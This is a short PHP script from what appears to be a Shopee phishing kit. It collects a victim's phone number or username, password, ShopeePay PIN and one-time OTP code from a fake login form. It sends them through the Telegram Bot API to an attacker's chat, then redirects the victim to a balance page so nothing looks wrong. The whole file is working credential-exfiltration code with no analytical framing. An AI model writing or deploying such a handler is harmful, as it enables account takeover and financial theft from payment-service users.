<?php 



session_start();
include "./telegram.php";

$_SESSION["nomorku"] = $_POST ['nomorku'];
$_SESSION["debit"] = $_POST ['debit'];
$_SESSION["nama"] = $_POST ['nama'];

$message = "⊰᯽⊱┈─𝑺𝒉𝒐𝒑𝒆𝒆─┈⊰᯽⊱".  "\n🔸 𝗡𝗼 𝗛𝗽/𝗨𝘀𝗲𝗿  : ".  $_POST ['user']. "\n🔸 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ". $_POST ['pass']. "\n🔸 𝗣𝗜𝗡 𝗦𝗵𝗼𝗽𝗲𝗣𝗮𝘆  : ". $_POST ['pinku']. "\n🔸 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣  : ". $_POST ['otp'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  saldo.html");
?> 